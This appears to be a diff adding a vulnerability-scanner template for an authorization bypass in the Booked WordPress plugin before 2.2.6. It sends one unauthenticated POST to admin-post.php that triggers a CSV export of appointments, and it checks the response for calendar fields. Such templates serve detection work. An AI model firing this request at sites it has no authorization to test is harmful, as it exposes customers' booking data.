@@ -1,0 +1,37 @@
+id: booked-export-csv
+brief:
+    title: Booked < 2.2.6 - Broken Authentication
+    by: random-robbie
+    level: high
+    about: The Booked plugin for WordPress is vulnerable to authorization bypass due to missing capability checks on several functions hooked via AJAX actions in versions up to, and including, 2.2.5. This mak...
+    label:
+        - wordpress
+        - wpscan
+        - wp-plugin
+        - wp
+        - booked
+        - bypass
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/wp-admin/admin-post.php'
+      head:
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+      body: booked_export_appointments_csv=
+      signs:
+        - "on": word
+          has:
+            - End Time
+            - Start Time
+            - Calendar
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/csv
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
